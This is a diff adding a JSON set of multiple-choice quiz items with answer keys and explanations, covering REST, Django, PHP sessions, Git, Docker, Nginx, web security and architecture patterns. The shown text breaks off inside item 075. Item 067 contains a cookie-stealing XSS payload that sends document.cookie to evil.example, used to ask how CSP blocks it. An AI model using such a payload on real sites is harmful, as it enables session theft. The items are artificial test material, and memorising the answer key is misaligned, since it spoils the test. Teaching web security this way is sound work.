@@ -1,0 +1,632 @@
+[
+ {
+  "id": "GEN-T2U2-044",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A POST to /api/v1/orders succeeds and a new order resource now exists at its own URI. Which status code and response header pairing is the conventional REST result for this?",
+  "opts": {
+   "A": "200 OK, with a Content-Location header naming the new order",
+   "B": "202 Accepted, with a Retry-After header telling the client when to look again",
+   "C": "201 Created, with a Location header naming the new order",
+   "D": "204 No Content, with an ETag header for the new order"
+  },
+  "ans": "C",
+  "exp": "A resource that has been created is reported with 201 Created, and the URI of the thing just created is advertised in the Location header. 202 Accepted is the tempting alternative but it means the work was only queued and no resource necessarily exists yet, which contradicts a stem that says the order was created.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-045",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A Django project served by Gunicorn's default synchronous workers must add a WebSocket endpoint for live order tracking. Why can this deployment not host that endpoint as it stands?",
+  "opts": {
+   "A": "Synchronous Gunicorn workers cannot terminate TLS, and WebSocket endpoints must be served over TLS",
+   "B": "WSGI models a request as a single call in and a single response out, with no representation for a long-lived bidirectional connection, so an ASGI server is required instead",
+   "C": "Django's ORM is synchronous, so a WebSocket handler would be unable to query the database at all",
+   "D": "WebSockets are carried over HTTP/2 streams, which synchronous Gunicorn workers do not implement"
+  },
+  "ans": "B",
+  "exp": "WSGI's contract is one callable invoked per request that returns one response body, which leaves no place for a connection that stays open and carries frames in both directions; ASGI was defined precisely to add that, and is what servers such as Uvicorn or Daphne speak. Option D is the plausible-sounding trap: the WebSocket handshake is an HTTP/1.1 Upgrade and does not depend on HTTP/2.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-046",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A PHP login handler runs:\n\nsession_start();\n$_SESSION['user_id'] = 42;\nsession_regenerate_id(true);\n\nWhat is the state immediately after the third line?",
+  "opts": {
+   "A": "$_SESSION is now empty and the application must write user_id again under the new identifier",
+   "B": "The session identifier is unchanged; only the session cookie's expiry time has been refreshed",
+   "C": "$_SESSION still holds user_id 42 under a new identifier, and the old session's data remains valid server-side until garbage collection removes it",
+   "D": "$_SESSION still holds user_id 42 under a newly issued identifier, and the old session's server-side data has been deleted"
+  },
+  "ans": "D",
+  "exp": "session_regenerate_id() carries the current $_SESSION contents across to a freshly issued identifier, and its boolean argument controls whether the old session's server-side data is destroyed; passing true destroys it. Option C is exactly what happens when the argument is false or omitted, which is why the defence against session fixation is to regenerate with deletion at the moment privilege changes.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-047",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "An API endpoint requires a write scope. A request arrives bearing an OAuth 2.0 access token that is well-formed, correctly signed and unexpired, but whose granted scopes are read-only. Which HTTP status expresses this outcome?",
+  "opts": {
+   "A": "403 Forbidden",
+   "B": "401 Unauthorized",
+   "C": "400 Bad Request",
+   "D": "422 Unprocessable Content"
+  },
+  "ans": "A",
+  "exp": "The server has successfully authenticated the caller and is refusing on authorization grounds, which is what 403 means. 401 is the frequent wrong pick: it signals that valid authentication credentials are absent or unusable, and re-presenting the same token would be the client's only recourse — pointless here, since the token is fine and the permission is not.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-048",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A single-page app on https://app.example.com calls an API on https://api.example.com. The browser's preflight OPTIONS request returns 401, so no cross-origin call ever completes — yet the identical requests succeed from curl with the same valid token. What is the most likely cause?",
+  "opts": {
+   "A": "The API omits the Access-Control-Allow-Credentials header from its responses",
+   "B": "Browsers strip the Authorization header from preflight requests only when the target is served over HTTPS",
+   "C": "The authentication middleware is registered ahead of the CORS middleware, so it rejects the deliberately credential-less preflight before CORS can answer it",
+   "D": "OPTIONS is a non-idempotent method, so the API's rate-limiting middleware refuses to serve it"
+  },
+  "ans": "C",
+  "exp": "A preflight OPTIONS request is generated by the browser and carries neither Authorization headers nor cookies by design, so any auth middleware sitting in front of the CORS middleware sees an unauthenticated request and answers 401 before the CORS headers are ever attached; registering CORS first, or exempting OPTIONS from auth, resolves it. A missing Access-Control-Allow-Credentials header would show up as a browser-blocked response on the real request, not as a 401 on the preflight.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-049",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "Doctrine ORM and Eloquent are both PHP persistence libraries, but they implement different data-access patterns. Which statement characterises the difference correctly?",
+  "opts": {
+   "A": "Eloquent is a Data Mapper whose plain models are persisted by a separate EntityManager, while Doctrine entities save themselves",
+   "B": "Eloquent is an Active Record implementation, where a model both maps a row and knows how to persist itself, while Doctrine is a Data Mapper that keeps entities free of persistence logic and delegates it to an EntityManager",
+   "C": "Both are Active Record implementations, differing only in whether mappings are declared as attributes or as properties on the model class",
+   "D": "Doctrine is an Active Record implementation tuned for read-heavy workloads, while Eloquent is a query builder that performs no object mapping"
+  },
+  "ans": "B",
+  "exp": "Eloquent models inherit persistence behaviour — save(), delete() and the query interface live on the model itself, the defining trait of Active Record — whereas a Doctrine entity is an ordinary PHP object with no knowledge of the database, and the EntityManager performs the mapping. Option A is the same distinction stated with the two libraries swapped, which is the mistake worth catching.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-050",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "In a Python service using the SQLAlchemy ORM:\n\nuser = session.get(User, 1)\nuser.email = \"new@example.com\"\nsession.commit()\n\nNo UPDATE statement appears anywhere in the code, yet the row changes. Which ORM mechanism accounts for this?",
+  "opts": {
+   "A": "The unit-of-work pattern — the Session tracks attribute changes on the instances it manages and flushes the resulting UPDATE as part of the commit",
+   "B": "session.get() returns a write-through proxy that pushes each attribute assignment to the database as the assignment happens",
+   "C": "The commit re-reads the object and rewrites every column of the row unconditionally, so no change tracking is needed",
+   "D": "The Session runs in autocommit mode by default, so each attribute assignment becomes its own transaction"
+  },
+  "ans": "A",
+  "exp": "Objects loaded through a Session stay in its identity map, mutating a mapped attribute marks the instance dirty, and the flush that precedes commit emits an UPDATE covering the changed columns — that accumulate-then-flush behaviour is the unit-of-work pattern. Option B is the intuitive but wrong model: nothing whatsoever reaches the database at assignment time, which is why rolling back discards the edit.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-051",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "An API implements optimistic concurrency: clients GET a resource, receive an ETag, and echo it in an If-Match header on the follow-up PUT. Two clients edit the same resource, and the second PUT arrives carrying an ETag that no longer matches the stored representation. Which status should the server return?",
+  "opts": {
+   "A": "409 Conflict",
+   "B": "428 Precondition Required",
+   "C": "423 Locked",
+   "D": "412 Precondition Failed"
+  },
+  "ans": "D",
+  "exp": "HTTP semantics say that when a conditional request header such as If-Match evaluates to false, the server must not perform the method and answers 412 Precondition Failed. 428 Precondition Required is the inverse situation — the server demanding a conditional header that the client failed to send — and here the client did send one.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-052",
+  "sub": "Backend development in PHP and Python: REST APIs, CRUD, middleware, auth, sessions and ORM",
+  "q": "A PHP application stores credentials as password_hash($pw, PASSWORD_DEFAULT). A later PHP upgrade changes what PASSWORD_DEFAULT resolves to, and the team wants existing users silently migrated at their next successful login. Which built-in function performs exactly the check of whether a stored hash was produced with different parameters and therefore ought to be recomputed?",
+  "opts": {
+   "A": "password_get_info()",
+   "B": "password_needs_rehash()",
+   "C": "hash_equals()",
+   "D": "password_verify(), passing the desired algorithm as a third argument"
+  },
+  "ans": "B",
+  "exp": "password_needs_rehash() compares the algorithm and options embedded in an existing hash against the ones supplied and returns true when they differ, so it is called right after a successful verify — the one moment the plaintext is available to rehash. password_get_info() merely reports what a hash was made with and makes no comparison and no decision, and password_verify() takes only the password and the hash.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-053",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A developer adds the line `config/secrets.env` to the repository's root `.gitignore` and commits it, but `git status` continues to report modifications to `config/secrets.env`. What explains this, and what stops it?",
+  "opts": {
+   "A": "`.gitignore` entries must be anchored with a leading slash to match a path inside a subdirectory, so the entry should read `/config/secrets.env`",
+   "B": "A `.gitignore` in the repository root does not apply to subdirectories, so a separate `.gitignore` has to be placed inside `config/`",
+   "C": "`.gitignore` is consulted only for untracked paths, so a file already in the index stays tracked; `git rm --cached config/secrets.env` and a commit stop it being tracked",
+   "D": "An ignore rule takes effect only after `.gitignore` itself is pushed to the remote, so the entry does nothing until the branch is pushed"
+  },
+  "ans": "C",
+  "exp": "Ignore rules are applied when Git decides whether to start tracking an untracked path; a path already recorded in the index is unaffected, so it must be removed from the index with `git rm --cached` while being left on disk. The leading-slash option is wrong because a slash only anchors the pattern to the repository root, which `config/secrets.env` already is — anchoring was never the problem.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-054",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A feature branch has three commits that exist only locally. The developer runs `git reset --soft HEAD~2`. What is the state of the branch, index and working tree immediately afterwards?",
+  "opts": {
+   "A": "HEAD moves back two commits and the changes those commits introduced are discarded from both the index and the working tree",
+   "B": "HEAD moves back two commits, the changes those commits introduced are left staged in the index, and the working tree is untouched",
+   "C": "HEAD moves back two commits and the changes those commits introduced appear as unstaged modifications, with the index matching the new HEAD",
+   "D": "The branch pointer stays on the newest commit and only the index is rewound by two commits"
+  },
+  "ans": "B",
+  "exp": "`--soft` moves the branch ref and HEAD only, leaving the index and working tree exactly as they were, which is why the squashed content shows up already staged and ready to be recommitted as one commit. The unstaged-modifications option describes `--mixed`, the default, which resets the index to the new HEAD but not the working tree; wholesale discarding is `--hard`.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-055",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A Node web application's Dockerfile contains, in this order:\n\n    COPY . .\n    RUN npm ci\n\nEvery build after a one-line source edit re-runs the full dependency install. Which change restores build-cache reuse for the install step?",
+  "opts": {
+   "A": "Move `RUN npm ci` above `COPY . .`, leaving both lines otherwise unchanged",
+   "B": "Add `--no-cache` to the `npm ci` invocation",
+   "C": "Replace `COPY . .` with `ADD . .`",
+   "D": "Copy `package.json` and `package-lock.json` alone, run `npm ci`, and only then `COPY . .`"
+  },
+  "ans": "D",
+  "exp": "A layer's cache entry is invalidated when the contents it copies change, so copying the whole source tree before installing makes any source edit invalidate the install layer; copying just the manifest and lockfile first means the install layer is only rebuilt when dependencies actually change. Simply hoisting `RUN npm ci` above `COPY . .` fails outright, because at that point no `package.json` exists in the image for npm to read.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-056",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A React application is packaged with a multi-stage Dockerfile whose final stage starts from `nginx:alpine` and copies only the built `dist/` directory out of the Node build stage. What is the principal advantage over a single-stage image that keeps the Node toolchain and serves the build itself?",
+  "opts": {
+   "A": "The shipped image contains no Node runtime, compilers or dev dependencies, which cuts both image size and the attack surface that has to be patched",
+   "B": "The intermediate build stage's layers are pushed alongside the final image and shared with other images, lowering total registry storage",
+   "C": "Nginx negotiates HTTP/3 for the static assets by default, which a Node-based static server cannot do",
+   "D": "The stages of a multi-stage build run in parallel, so the dependency install overlaps with the production bundle step"
+  },
+  "ans": "A",
+  "exp": "The value of the pattern is that only the artefacts explicitly copied into the final stage survive into the shipped image, so build-time tooling and dev dependencies never become part of the deployed surface. The registry-storage option inverts the mechanism: intermediate stages are not part of the resulting image and are not pushed at all.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-057",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "In the install step of a CI job for a Node web application, why is `npm ci` normally preferred over `npm install`?",
+  "opts": {
+   "A": "`npm ci` installs only production dependencies, so devDependencies never reach the CI runner",
+   "B": "`npm ci` installs exactly the dependency tree recorded in `package-lock.json` and fails outright if the lockfile and `package.json` disagree, so the build is reproducible",
+   "C": "`npm ci` first refreshes `package-lock.json` to the newest versions permitted by the declared semver ranges, so CI always tests against current dependencies",
+   "D": "`npm ci` links packages from the runner's global cache instead of creating a local `node_modules` directory, so nothing has to be written to disk"
+  },
+  "ans": "B",
+  "exp": "`npm ci` treats the lockfile as authoritative rather than as a hint, so it cannot silently resolve a different version than a developer got, and a lockfile that has drifted out of sync with `package.json` breaks the build instead of being quietly rewritten. The devDependencies option is wrong because omitting them is a separate choice controlled by `--omit=dev`; `npm ci` installs the full tree by default, which CI needs in order to run tests and linters.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-058",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A web application's pipeline compiles the application from source once for the staging deployment and again for the production deployment, both from the same Git commit. Production deployments occasionally misbehave in ways the staging run that approved them did not. Which pipeline change most directly eliminates this class of failure?",
+  "opts": {
+   "A": "Pin the CI runner image to a fixed tag so that both builds begin from an identical base operating system",
+   "B": "Tag the Git commit before the production build so that both deployments are traceable to a single revision",
+   "C": "Build the artefact once and promote that same immutable artefact from staging into production, supplying environment-specific values as configuration at deploy time",
+   "D": "Re-run the full test suite against the production environment immediately after every deployment"
+  },
+  "ans": "C",
+  "exp": "Two builds are two artefacts, and anything non-deterministic in the build — a floating transitive dependency, a differing toolchain, a stale cache — means the thing tested in staging is not the thing running in production; building once and promoting the identical artefact removes the divergence by construction. Pinning the runner image narrows one source of drift but still produces two separately built artefacts, so the failure mode survives.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-059",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A Django application served by Gunicorn is managed as a systemd service on a Linux server. Which setting in its unit file causes systemd to bring the service back automatically when the process exits with a non-zero status?",
+  "opts": {
+   "A": "`Restart=on-failure` in the `[Service]` section",
+   "B": "`WantedBy=multi-user.target` in the `[Install]` section",
+   "C": "`After=network.target` in the `[Unit]` section",
+   "D": "`RemainAfterExit=yes` in the `[Service]` section"
+  },
+  "ans": "A",
+  "exp": "`Restart=on-failure` is the directive that tells systemd to restart the unit when it terminates with a non-zero exit code or is killed by a signal. `RemainAfterExit=yes` is close in appearance but does the opposite of what is wanted: it makes systemd regard the unit as still active after its process has exited, so nothing is restarted; `WantedBy` only governs whether the unit starts at boot when enabled.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-060",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "Nginx terminates TLS at the edge and reverse-proxies to an application on 127.0.0.1:8000. The application's access log records every request as coming from 127.0.0.1. Assuming the application is already configured to trust a forwarded client-address header, which line added to the proxying `location` block gives it the real client address?",
+  "opts": {
+   "A": "`proxy_set_header Host $host;`",
+   "B": "`proxy_pass_request_headers on;`",
+   "C": "`real_ip_header X-Forwarded-For;`",
+   "D": "`proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;`"
+  },
+  "ans": "D",
+  "exp": "From the application's point of view the TCP peer genuinely is Nginx on the loopback address, so the client address has to be carried in a header that Nginx sets on the upstream request; `$proxy_add_x_forwarded_for` appends `$remote_addr` to any inbound `X-Forwarded-For` value. `real_ip_header` looks apt but solves the mirror-image problem — it tells *Nginx* to take its own `$remote_addr` from a header when Nginx itself sits behind another proxy, and it changes nothing about what the upstream receives.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-061",
+  "sub": "Git version control, Docker, CI/CD, Linux administration, Nginx and deployment",
+  "q": "A client-side-routed single-page application is served by Nginx from `/var/www/app`, which contains `index.html` and a hashed asset bundle. Navigating within the app works, but reloading the browser on `/dashboard` returns 404. Which directive in the `location /` block fixes it?",
+  "opts": {
+   "A": "`autoindex on;`",
+   "B": "`try_files $uri $uri/ /index.html;`",
+   "C": "`index index.html index.htm;`",
+   "D": "`rewrite ^/dashboard$ / permanent;`"
+  },
+  "ans": "B",
+  "exp": "`/dashboard` exists only as a route inside the JavaScript router, not as a file on disk, so Nginx must fall back to serving `index.html` for any path it cannot resolve and let the client-side router read the URL; `try_files` with `/index.html` as its final fallback does exactly that while still serving real files such as the asset bundle directly. The `index` directive does not help because it only chooses a default file for requests that resolve to a directory, and `/dashboard` resolves to nothing at all.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-062",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An application's session cookie is set with SameSite=Lax. Which request originating from an attacker-controlled page will still arrive at the application carrying that cookie?",
+  "opts": {
+   "A": "An auto-submitting cross-site POST form targeting an application endpoint",
+   "B": "A cross-origin fetch() to the application issued with credentials: 'include'",
+   "C": "A top-level navigation to an application URL caused by the user clicking a link on the attacker's page",
+   "D": "An <img> element on the attacker's page whose src points at an application URL"
+  },
+  "ans": "C",
+  "exp": "SameSite=Lax withholds the cookie on all cross-site subresource and non-safe-method requests, but deliberately allows it on top-level navigations made with a safe method such as GET, so ordinary inbound links keep working. The auto-submitting POST form is the classic CSRF vector and is exactly what Lax blocks, which is why it is tempting but wrong.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-063",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A link-preview feature fetches any URL the user submits and returns the response body. An attacker submits a URL pointing at the cloud provider's link-local instance metadata endpoint and retrieves the instance's credentials. In the OWASP Top 10 (2021 edition), which category names this class of flaw directly?",
+  "opts": {
+   "A": "A01:2021 - Broken Access Control",
+   "B": "A03:2021 - Injection",
+   "C": "A05:2021 - Security Misconfiguration",
+   "D": "A10:2021 - Server-Side Request Forgery (SSRF)"
+  },
+  "ans": "D",
+  "exp": "SSRF is the flaw of making the server issue a request to a destination chosen by the user, and the 2021 edition added it as its own category at A10 precisely because URL-fetching features had become common. A01 Broken Access Control is the nearest competitor, but the failure here is not that an authorisation check was skipped - it is that the server was made into the attacker's HTTP client.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-064",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An adversary passively records a site's encrypted TLS traffic today and obtains the server's long-term private key two years later. Which property, if the connections had it, keeps the recorded traffic undecryptable?",
+  "opts": {
+   "A": "Record protection with an AEAD cipher such as AES-GCM",
+   "B": "Forward secrecy from an ephemeral (EC)DHE key exchange, so session keys are never recoverable from the certificate's key",
+   "C": "Certificate pinning in the client",
+   "D": "Strict-Transport-Security sent with a long max-age"
+  },
+  "ans": "B",
+  "exp": "Forward secrecy comes from deriving each session's keys through an ephemeral Diffie-Hellman exchange whose private values are discarded, so the certificate key only authenticates the handshake and never encrypts the session keys - which is why TLS 1.3 dropped static RSA key transport entirely. AES-GCM protects each record's confidentiality and integrity in transit but says nothing about how the keys were established, so it does not help against a later key compromise.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-065",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "Users reach a portal by typing the bare domain name, and an on-path attacker strips the HTTP-to-HTTPS redirect on that very first request. Which measure protects a user who has never visited the site before?",
+  "opts": {
+   "A": "Getting the domain added to the browsers' HSTS preload list",
+   "B": "Sending Strict-Transport-Security with a two-year max-age and includeSubDomains on every HTTPS response",
+   "C": "Marking every cookie Secure and HttpOnly",
+   "D": "Publishing a CAA DNS record naming the site's certificate authority"
+  },
+  "ans": "A",
+  "exp": "An HSTS policy is trust-on-first-use: the browser only learns it after one successful HTTPS response, so the very first plaintext request remains strippable - the preload list closes that gap by shipping the policy inside the browser before any visit. Option B is correct practice and is in fact the prerequisite for preloading, but on its own it cannot protect a first-time visitor.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-066",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A report screen lets the user pick which column to sort by. The developer tries to bind that column name as a query placeholder, but the driver quotes it as a string literal and the ordering stops working. What is the correct way to make the feature both work and be injection-safe?",
+  "opts": {
+   "A": "Escape the value with the driver's string-escaping function before concatenating it into the ORDER BY clause",
+   "B": "Concatenate the value but reject any input containing a semicolon, a quote or the word UNION",
+   "C": "Compare the value against a fixed server-side allow-list of permitted column names and interpolate only the matching literal from that list",
+   "D": "Wrap the value in single quotes inside the ORDER BY clause so the database treats it as a string"
+  },
+  "ans": "C",
+  "exp": "Placeholders bind values, not identifiers, so a table name, column name or sort direction can never be parameterised; the only safe substitute is to map user input onto a fixed set of identifiers the code already knows and emit one of those. Escaping (option A) is designed for string literals and does not make an identifier position safe, and denylisting keywords (option B) is defeated by inputs the list did not anticipate.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-067",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A page is served with the header Content-Security-Policy: script-src 'self'. An attacker succeeds in reflecting the markup <img src=x onerror=\"fetch('https://evil.example/'+document.cookie)\"> into that page. What happens when the image fails to load?",
+  "opts": {
+   "A": "The handler runs, because script-src governs <script> elements only and not event handler attributes",
+   "B": "The handler runs, because the injected markup is delivered from the page's own origin, which 'self' permits",
+   "C": "The handler is blocked only if the response additionally sends X-XSS-Protection: 1; mode=block",
+   "D": "The handler is blocked, because an inline event handler attribute counts as inline script and 'self' does not permit inline script"
+  },
+  "ans": "D",
+  "exp": "CSP treats inline event handler attributes as inline script, so a script-src list that omits 'unsafe-inline' (and supplies no matching nonce or hash) refuses to execute them - which is the main reason a nonce-based policy without 'unsafe-inline' blunts reflected XSS. Option B confuses the origin that served the HTML with the origin of the script source: 'self' only whitelists externally loaded scripts from the same origin, never inline code.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-068",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "An application has an unfixed XSS flaw. Its session cookie is set Secure; HttpOnly; SameSite=Strict. What is the accurate assessment of the attacker's position?",
+  "opts": {
+   "A": "The injected script cannot read the cookie value, but it runs inside the application's own origin and can still drive authenticated state-changing requests to which the browser attaches the cookie",
+   "B": "SameSite=Strict causes the browser to refuse the injected script's requests to the application, because they originate from attacker-supplied markup",
+   "C": "HttpOnly prevents the injected script from executing in the first place",
+   "D": "Secure means the cookie is stored encrypted in the browser's cookie jar, so it cannot be exfiltrated even by script"
+  },
+  "ans": "A",
+  "exp": "HttpOnly hides the cookie from document.cookie, but the injected script executes with the page's origin and privileges, so it can perform the actions the session authorises without ever seeing the token - which is why cookie flags mitigate but never substitute for fixing XSS. Option B misreads SameSite: it is evaluated against the site of the request's initiating document, and here that document is the application itself, so the requests are same-site.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-069",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A newly deployed HTTPS site loads without warnings in every desktop browser, but a curl call from a server fails with 'SSL certificate problem: unable to get local issuer certificate'. What is the most likely cause?",
+  "opts": {
+   "A": "The leaf certificate has expired, and browsers ignore expiry for certificates from well-known CAs",
+   "B": "The server presents the leaf certificate but omits the intermediate CA certificate; browsers complete the chain from cached intermediates or by fetching the issuer, while curl's trust store holds only roots",
+   "C": "The certificate's subject alternative names do not include the hostname being requested",
+   "D": "curl does not send SNI, so the server answers with the default virtual host's certificate"
+  },
+  "ans": "B",
+  "exp": "That specific error means chain building stopped short of a trusted root, and the usual cause is a server bundle missing the intermediate - browsers paper over it because they cache intermediates seen elsewhere and can fetch the issuer named in the certificate, which command-line clients generally do not do. A hostname mismatch (option C) would produce a distinct 'subject name does not match' error and would fail in the browser too.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-070",
+  "sub": "Web security: OWASP Top 10, SSL/TLS, CSRF, XSS and SQL injection prevention",
+  "q": "A stateless JSON API cannot keep a per-session CSRF token server-side, so it instead requires every state-changing request to carry a custom header such as X-CSRF-Token. Why does merely requiring that header defeat classic CSRF?",
+  "opts": {
+   "A": "Because an attacker's page has no way to discover which header name the application expects",
+   "B": "Because browsers refuse to attach cookies to any request that carries a custom header",
+   "C": "Because a custom header makes the request non-simple, so the browser must first send a CORS preflight, and without a permissive CORS response the state-changing request is never delivered",
+   "D": "Because HTML forms cannot set request headers, and forms are the only cross-site request vector available to an attacker"
+  },
+  "ans": "C",
+  "exp": "Only a short safelist of headers may appear on a cross-origin request without a preflight; adding any other header forces an OPTIONS preflight that the application simply declines, so the real request never reaches the endpoint. Option D gets the form half right but is wrong overall - script-driven fetch and XHR are also cross-site vectors, and it is CORS, not the absence of those vectors, that stops them.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-071",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A `Rectangle` class exposes `setWidth()` and `setHeight()`. A `Square` subclass overrides both so that setting one dimension silently sets the other. Reporting code that has always worked against a `Rectangle` reference — set width 5, set height 4, expect area 20 — starts producing 16 once a `Square` instance is passed in. Which SOLID principle has been violated?",
+  "opts": {
+   "A": "Single Responsibility Principle",
+   "B": "Interface Segregation Principle",
+   "C": "Liskov Substitution Principle",
+   "D": "Open/Closed Principle"
+  },
+  "ans": "C",
+  "exp": "Liskov substitution requires that an instance of a subtype can replace the supertype without breaking any guarantee the caller was entitled to rely on, and `Square` breaks the independent-dimensions contract that `Rectangle` advertises. The Open/Closed Principle is the tempting alternative but it concerns whether new behaviour can be added without editing existing code, and nothing here was extended by modification — the inheritance itself is what is unsound.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-072",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A team argues that because every collaborator is supplied through a dependency-injection container rather than constructed with `new`, the codebase satisfies the Dependency Inversion Principle. What does DIP additionally require that a DI container by itself does not give you?",
+  "opts": {
+   "A": "That object graphs be wired by a framework rather than by hand-written factory code",
+   "B": "That the high-level policy and the low-level implementation both depend on an abstraction defined in terms of the high-level module's needs, rather than the policy depending on the concrete implementation",
+   "C": "That every concrete class in the system be paired with an interface, even where only one implementation exists",
+   "D": "That dependencies be resolved at runtime from configuration rather than being fixed at compile time"
+  },
+  "ans": "B",
+  "exp": "DIP is a statement about the direction of source-level dependencies — the policy layer owns the abstraction and the detail layer conforms to it — so a container that injects a concrete database class into a service still inverts nothing. Runtime resolution from configuration is a real capability of DI containers and sounds authoritative, but late binding is a mechanism, not the ownership rule DIP is about.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-073",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "An order-placement flow spans an Order service, a Payment service and an Inventory service, each owning its own database. The architect rules out holding one ACID transaction open across all three. Which approach keeps the business outcome consistent instead?",
+  "opts": {
+   "A": "Two-phase commit driven by a coordinator in the API gateway",
+   "B": "Optimistic locking with a version column on the order row, retried on conflict",
+   "C": "Giving the three services a shared schema so a single database transaction can span them",
+   "D": "A saga: a sequence of local transactions in which each service commits its own step and publishes an event, with compensating transactions undoing earlier steps if a later one fails"
+  },
+  "ans": "D",
+  "exp": "A saga trades atomicity for eventual consistency, replacing rollback with explicit compensating actions such as refunding a payment or releasing a stock reservation, which is exactly the pattern for cross-service consistency without a distributed lock. Two-phase commit is the most tempting option because it does deliver atomicity, but it is precisely the distributed transaction that was ruled out — the coordinator becomes a blocking single point of failure holding locks across all three databases.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-074",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A recommendation service begins responding in about 30 seconds instead of 50 milliseconds. The checkout service, which calls it synchronously on the product page, exhausts its request-handling thread pool waiting, and within minutes checkout stops serving even requests that never touch recommendations. Which pattern is specifically intended to stop this propagation?",
+  "opts": {
+   "A": "A circuit breaker that opens after a failure or latency threshold and fails fast on the recommendation call until the dependency is probed healthy again",
+   "B": "Retrying each recommendation call with exponential backoff and jitter",
+   "C": "Horizontally scaling the checkout service to more replicas",
+   "D": "Raising the HTTP client timeout on the recommendation call so slow responses still succeed"
+  },
+  "ans": "A",
+  "exp": "The failure is resource exhaustion caused by threads parked on a slow dependency, so the fix is to stop calling it: an open circuit breaker returns immediately with a fallback, freeing capacity for unrelated work, and a bulkhead limiting that dependency to its own bounded pool serves the same containment goal. Retry with backoff is a genuinely good practice for transient errors, which makes it tempting, but against an overloaded dependency it multiplies in-flight calls and accelerates the collapse; raising the timeout holds threads even longer.",
+  "conf": "high"
+ },
+ {
+  "id": "GEN-T2U2-075",
+  "sub": "Architecture and scale: MVC, microservices, SOLID, event-driven systems, caching and queues",
+  "q": "A service publishes `AccountDebited` and `AccountCredited` events to an Apache Kafka topic with six partitions, consumed by a consumer group. Events concerning the same account must be processed in the order they were produced, while events for different accounts may be processed in parallel. Which measure achieves this?",
+  "opts": {
+   "A": "Configuring the consumer group with exactly as many consumer instances as there are partitions",
+   "B": "Producing every event with the account identifier as the message key, so that all events for one account are routed to the same partition",
+   "C": "Setting `auto.offset.reset` to `earliest` on the consumer group",
+   "D": "Increasing the topic's partition count so each account is statistically likely to get its own partition"
+  },
+  "ans": "B",
